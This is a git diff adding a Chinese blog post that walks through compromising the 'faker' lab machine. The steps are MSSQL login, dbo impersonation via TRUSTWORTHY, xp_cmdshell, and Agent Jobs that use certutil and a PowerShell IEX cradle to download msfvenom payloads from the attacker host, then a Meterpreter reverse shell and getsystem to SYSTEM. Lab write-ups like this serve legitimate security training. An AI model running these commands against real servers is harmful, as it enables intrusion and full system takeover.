@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>the0n3 - MazeSec faker</title>
+        <meta name="description" content="the0n3">
+            <link rel="canonical" href="https://blog.the0n3.top">
+        <script>
+        (function () {
+            try {
+                var key = 'theme';
+                var saved = localStorage.getItem(key);
+                var theme = (saved === 'dark' || saved === 'light') ? saved : 'light';
+                document.documentElement.setAttribute('data-theme', theme);
+                document.documentElement.style.colorScheme = theme;
+            } catch (e) {
+                document.documentElement.setAttribute('data-theme', 'light');
+                document.documentElement.style.colorScheme = 'light';
+            }
+        })();
+    </script>
+    <!-- 使用 GitHub Markdown 样式 -->
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/site.css">
+            <link rel="stylesheet" href="/assets/css/reading-progress.css">
+            <link rel="stylesheet" href="/assets/css/image-enhance.css">
+        <link rel="stylesheet" href="/assets/css/nav-reveal.css">
+    <!-- 代码高亮样式 -->
+    <link rel="stylesheet" href="/assets/prism/prism.css">
+</head>
+<body>
+        <div class="reading-progress" aria-hidden="true">
+        <div class="reading-progress__bar"></div>
+    </div>
+        <header>
+        <nav>
+            <div class="nav-right">
+                <a href="/">首页</a>
+                <a href="/archives">归档</a>
+                <a href="/categories">分类</a>
+                <a href="/tags">标签</a>
+            </div>
+        </nav>
+    </header>
+                <div class="page-layout">
+            <main class="markdown-body">
+                
+<article class="post-content">
+    <h1>MazeSec faker</h1>
+    <p>
+        <span class="meta">发布于: 2025-11-06 05:37</span>
+    </p>
+    <div class="post-body">
+        <p>提示：初始凭证db-user:whoami</p>
+<p>提示：user的flag在c:/根目录下</p>
+<h2>初始信息收集</h2>
+<p>存活主机扫描</p>
+<pre><code class="language-bash">┌──(npc㉿kali)-[~/hackmyvm/faker]
+└─$ sudo arp-scan -l                     
+...
+192.168.219.141 00:0c:29:dd:63:d7       VMware, Inc.</code></pre>
+<p>全端口扫描，仅开放了1433端口</p>
+<pre><code class="language-bash">┌──(npc㉿kali)-[~/hackmyvm/faker]
+└─$ fscan -h 192.168.219.141 -nobr -p 1-65535
+...
+[8.7s] [*] 端口开放 192.168.219.141:1433</code></pre>
+<h2>数据库连接</h2>
+<p>使用impacket mssqlclient连接数据库</p>
+<pre><code class="language-bash">impacket-mssqlclient db-user@192.168.219.141 -windows-auth</code></pre>
+<p><img src="/images/maze-faker/1.png" alt="" /></p>
+<h3>guest用户信息收集</h3>
+<p>查看当前<code>guest</code>用户的权限</p>
+<pre><code class="language-sql">-- 检查当前用户是否属于SQL Server的最高服务器级别角色 sysadmin
+SQL (faker\db-user  guest@master)&gt; SELECT IS_SRVROLEMEMBER('sysadmin');
+0   
+-- 检查当前用户是否属于当前数据库的数据库所有者角色 db_owner
+SQL (faker\db-user  guest@master)&gt; SELECT IS_MEMBER('db_owner'); 
+0   </code></pre>
+<h3>faker用户信息收集</h3>
+<p>收集信息，找到一个faker数据库，一个Notes表</p>
+<pre><code class="language-sql">-- 列出所有数据库
+SQL (faker\db-user  guest@master)&gt; SELECT name FROM sys.databases;
+name     
+------   
+master   
+tempdb   
+model    
+msdb     
+faker    
+
+-- 使用faker数据库
+SQL (faker\db-user  guest@master)&gt; USE faker;
+ENVCHANGE(DATABASE): Old Value: master, New Value: faker
+INFO(db-server): Line 1: 已将数据库上下文更改为 "faker"。
+
+-- 列出faker数据库中的所有用户表
+SQL (faker\db-user  faker\db-user@faker)&gt; SELECT name FROM faker.sys.objects WHERE type = 'U';
+name    
+-----   
+Notes  </code></pre>
+<p><img src="/images/maze-faker/2.png" alt="" /></p>
+<p>查看表结构，表内容</p>
+<pre><code class="language-sql">SQL (faker\db-user  faker\db-user@faker)&gt; SELECT COLUMN_NAME, DATA_TYPE FROM information_schema.columns WHERE TABLE_NAME = 'Notes';
+COLUMN_NAME   DATA_TYPE   
+-----------   ---------   
+NoteID        int         
+
+NoteContent   nvarchar    
+
+SQL (faker\db-user  faker\db-user@faker)&gt; SELECT * FROM Notes;
+NoteID   NoteContent                     
+------   -----------------------------   
+     1   为庆祝T1进入决赛，此数据库已经开启TRUSTWORTHY   </code></pre>
+<p>查看当前<code>faker\db-user</code>用户的权限，faker用户是db_owner角色，但不是sysadmin角色</p>
+<pre><code class="language-sql">SQL (faker\db-user  faker\db-user@faker)&gt; SELECT IS_SRVROLEMEMBER('sysadmin');
+
+-   
+0   
+
+SQL (faker\db-user  faker\db-user@faker)&gt; SELECT IS_MEMBER('db_owner');
+
+-   
+1</code></pre>
+<h2>模拟dbo角色</h2>
+<p>提示开启了TRUSTWORTHY，搜下mssql相关文章<a href="https://blog.csdn.net/qq_40710190/article/details/125667019">MSSQL渗透备忘录</a></p>
+<p>如果模拟<code>dbo</code>用户成功，并且<code>TRUSTWORTHY</code>属性为1，可以给其他用户添加<code>sysadmin</code>权限，拿到<code>sysadmin</code>权限的shell</p>
+<p><img src="/images/maze-faker/4.png" alt="" /></p>
+<p>faker、msdb库都有TRUSTWORTHY</p>
+<pre><code class="language-sql">SQL (faker\db-user  faker\db-user@faker)&gt; select name, is_trustworthy_on from sys.databases
+name     is_trustworthy_on   
+------   -----------------   
+master                   0   
+
+tempdb                   0   
+
+model                    0   
+
+msdb                     1   
+
+faker                    1   </code></pre>
+<p><img src="/images/maze-faker/3.png" alt="" /></p>
+<p>前面知道，<code>faker\db-user</code>用户是db_owner角色，可以模拟<code>dbo</code>用户，dbo角色有sysadmin服务器级用户</p>
+<pre><code class="language-sql">SQL (faker\db-user  faker\db-user@faker)&gt; EXECUTE AS USER = 'dbo';
+SQL (FAKER\Administrator  dbo@faker)&gt; SELECT USER_NAME();
+
+---   
+dbo   
+
+SQL (FAKER\Administrator  dbo@faker)&gt; SELECT IS_SRVROLEMEMBER('sysadmin');
+
+-   
+1   </code></pre>
+<p><img src="/images/maze-faker/5.png" alt="" /></p>
+<p>不过，这里dbo角色已经有了<code>sysadmin</code>权限，还有必要给<code>faker\db-user</code>用户添加属性吗？</p>
+<h2>开启xp_cmdshell</h2>
+<p>尝试开启xp_cmdshell，执行系统命令</p>
+<pre><code class="language-sql">SQL (FAKER\Administrator  dbo@faker)&gt; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+INFO(db-server): Line 196: 配置选项 'show advanced options' 已从 0 更改为 1。请运行 RECONFIGURE 语句进行安装。
+SQL (FAKER\Administrator  dbo@faker)&gt; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+INFO(db-server): Line 196: 配置选项 'xp_cmdshell' 已从 0 更改为 1。请运行 RECONFIGURE 语句进行安装。
+SQL (FAKER\Administrator  dbo@faker)&gt; EXEC xp_cmdshell 'whoami';
+output                   
+----------------------   
+nt service\mssqlserver   
+
+NULL   </code></pre>
+<p><img src="/images/maze-faker/6.png" alt="" /></p>
+<p>拿到user flag</p>
+<pre><code class="language-sql">SQL (FAKER\Administrator  dbo@faker)&gt; EXEC xp_cmdshell 'type C:\flag\user.txt';
+output                             
+--------------------------------   
+880e66eec0d8b05645bb027b77948c92   
+
+NULL                               
+
+notes:the agent is running         </code></pre>
+<h2>MSSQL Agent Job提权</h2>
+<p>flag里提示 <code>notes:the agent is running</code>，搜索<code>mssql agent利用</code>  </p>
+<p>找到<code>【技术分享】MSSQL注入时通过Agent Job执行命令的方法</code>这种利用方式，然后拷打AI就给出了利用方式</p>
+<p><img src="/images/maze-faker/7.png" alt="" /></p>
+<p>收集主机系统信息，64位Windows Server 2022</p>
+<pre><code class="language-plaintext">主机名:           DB-SERVER                                                             
+OS 名称:          Microsoft Windows Server 2022 Datacenter                             
+系统类型:         x64-based PC                                                           </code></pre>
+<p>msf生成正向shell exe，agent job定时任务下载并执行exe，上线msf</p>
+<pre><code class="language-bash">┌──(npc㉿kali)-[~/hackmyvm/faker]
+└─$ msfvenom -p windows/x64/meterpreter/bind_tcp lport=4444 -f exe -o shell.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 496 bytes
+Final size of exe file: 7168 bytes
+Saved as: shell.exe</code></pre>
+<p>msf监听跑起来</p>
+<pre><code class="language-bash">┌──(npc㉿kali)-[~/hackmyvm/faker]
+└─$ msfconsole 
+msf &gt; use exploit/multi/handler 
+[*] Using configured payload generic/shell_reverse_tcp
+msf exploit(multi/handler) &gt; set payload windows/x64/meterpreter/bind_tcp
+payload =&gt; windows/x64/meterpreter/bind_tcp
+msf exploit(multi/handler) &gt; set rhost 192.168.219.141
+rhost =&gt; 192.168.219.141
+msf exploit(multi/handler) &gt; run</code></pre>
+<p><img src="/images/maze-faker/10.png" alt="" /></p>
+<p>python开启web服务</p>
+<pre><code class="language-bash">┌──(npc㉿kali)-[~/hackmyvm/faker]
+└─$ python3 -m http.server 80                
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...  </code></pre>
+<p>agent job创建</p>
+<pre><code class="language-sql">USE msdb;
+EXEC dbo.sp_add_job @job_name = 'TestDownload';
+EXEC sp_add_jobstep @job_name = 'TestDownload', @step_name = 'Download File', @subsystem = 'CMDEXEC', @command = 'certutil -urlcache -split -f http://192.168.219.130/shell.exe C:\\Windows\\Temp\\shell.exe', @on_success_action = 1;
+EXEC sp_add_jobserver @job_name = 'TestDownload';
+EXEC sp_add_jobschedule @job_name = 'TestDownload', @name = 'RunOnceNow', @freq_type = 1;
+EXEC sp_start_job 'TestDownload';</code></pre>
+<p><img src="/images/maze-faker/8.png" alt="" /></p>
+<p>可以看到下载请求</p>
+<p><img src="/images/maze-faker/9.png" alt="" /></p>
+<p>验证发现temp目录似乎不可写，根目录也不可写</p>
+<p><img src="/images/maze-faker/11.png" alt="" /></p>
+<p>直接powershell脚本上线，无文件落地内存加载，msf换成反弹shell，正向shell一直没动静</p>
+<pre><code class="language-bash">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.219.130 LPORT=4444 -f psh-reflection -o shell.ps1</code></pre>
+<p>msf监听改成反弹shell</p>
+<pre><code class="language-bash">┌──(npc㉿kali)-[~/hackmyvm/faker]
+└─$ msfconsole
+msf &gt; use exploit/multi/handler 
+[*] Using configured payload generic/shell_reverse_tcp
+msf exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp
+payload =&gt; windows/x64/meterpreter/reverse_tcp
+msf exploit(multi/handler) &gt; set lhost 192.168.219.130
+lhost =&gt; 192.168.219.130
+msf exploit(multi/handler) &gt; </code></pre>
+<p>agent job创建执行powershell脚本</p>
+<pre><code class="language-sql">USE msdb;
+EXEC dbo.sp_add_job @job_name = N'RevShell';
+EXEC sp_add_jobstep @job_name = N'RevShell', @step_name = N'Run', @subsystem = N'CMDEXEC', @command = N'powershell -c "IEX (New-Object Net.WebClient).DownloadString(''http://192.168.219.130/shell.ps1'')"', @on_success_action = 1;
+EXEC sp_add_jobserver @job_name = N'RevShell';
+EXEC sp_add_jobschedule @job_name = N'RevShell', @name = N'Now', @freq_type = 1;
+EXEC sp_start_job N'RevShell';</code></pre>
+<h2>system提权</h2>
+<p>拿到meterpreter shell，当前是sqlserveragent用户</p>
+<pre><code class="language-bash">meterpreter &gt; getuid
+Server username: NT Service\SQLSERVERAGENT</code></pre>
+<p>进入shell环境</p>
+<pre><code class="language-bash">meterpreter &gt; shell
+Process 1692 created.
+Channel 1 created.
+
+C:\Windows\system32&gt;chcp 65001
+chcp 65001
+
+C:\Windows\system32&gt;whoami /all
+whoami /all
+
+User Name                 SID                                                           
+========================= ==============================================================
+nt service\sqlserveragent S-1-5-80-344959196-2060754871-2302487193-2804545603-1466107430
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled </code></pre>
+<p>其中<code>SeImpersonatePrivilege</code>或<code>SeCreateGlobalPrivilege</code>可以用来模拟其他用户（system）的token去创建进程</p>
+<p>msf已经集成到<code>getsystem</code>命令里</p>
+<pre><code class="language-bash">meterpreter &gt; getuid
+Server username: NT Service\SQLSERVERAGENT
+meterpreter &gt; getsystem
+...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
+meterpreter &gt; getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter &gt; ls C:/Users/Administrator/Desktop/root.txt</code></pre>    </div>
+        <div class="post-meta-footer">
+                    <span class="post-meta-item">分类:
+                                    <span>渗透</span>
+                            </span>
+                            <span class="post-meta-item">标签:
+                                    <span>#sysadmin</span>
+                                    <span>#potato</span>
+                            </span>
+            </div>
+    </article>
+
+            </main>
+                <aside class="post-toc" aria-label="Table of contents">
+        <div class="toc-title">目录</div>
+        <nav class="toc-list"></nav>
+    </aside>
+            </div>
+        <button id="backToTop" class="fab fab-top" type="button" aria-label="返回顶部" title="返回顶部">↑</button>
+    <button id="themeToggle" class="theme-toggle" type="button" aria-label="切换主题" title="切换主题"></button>
+    <script src="/assets/js/site.js"></script>
+        <script src="/assets/js/navReveal.js"></script>
+        <script src="/assets/js/readingProgress.js"></script>
+            <script src="/assets/js/imageEnhance.js"></script>
+        <!-- 启动代码高亮及行号显示 -->
+    <script src="/assets/prism/prism.js"></script>
+    <script src="/assets/prism/prism-line-number.js"></script>
+    <!-- 主题切换 -->
+    <script src="/assets/js/ThemeSwitch.js"></script>
+</body>
+</html>
